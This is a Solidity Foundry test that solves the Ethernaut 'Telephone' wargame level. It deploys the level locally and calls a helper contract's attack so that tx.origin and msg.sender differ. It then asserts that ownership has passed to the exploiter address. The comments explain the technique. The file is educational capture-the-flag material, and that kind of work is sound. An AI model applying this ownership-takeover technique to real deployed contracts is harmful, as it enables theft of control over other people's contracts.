pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "../src/TelephoneHelper.sol";
import "ethernaut/contracts/levels/TelephoneFactory.sol";

contract A {
    function hey() public {}
}

contract TelephoneExploit is DSTest {
    Vm private vm = Vm(address(HEVM_ADDRESS));
    Ethernaut private ethernaut;
    address private eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testExploit() public {
        // Setting up the level
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernauTelephone = Telephone(payable(levelAddress));

        // Exploit the contract
        // We deploy another contract so that tx.origin and msg.sender have different addresses
        // - tx.origin: the original user wallet that initiated the transaction
        // - msg.sender: the immediate sender of this specific transaction or call
        // ie. A -> B -> C, at the C stage, tx.origin = A and msg.sender = B
        emit log_named_address("Telephone contract owner", ethernauTelephone.owner());
        TelephoneHelper telephoneHelper = new TelephoneHelper();
        telephoneHelper.attack(levelAddress);
        assertEq(ethernauTelephone.owner(), eoaAddress);
        emit log_named_address("New Telephone contract owner", ethernauTelephone.owner());
        emit log_named_address("Exploiter address", eoaAddress);

        // Submit the solution
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
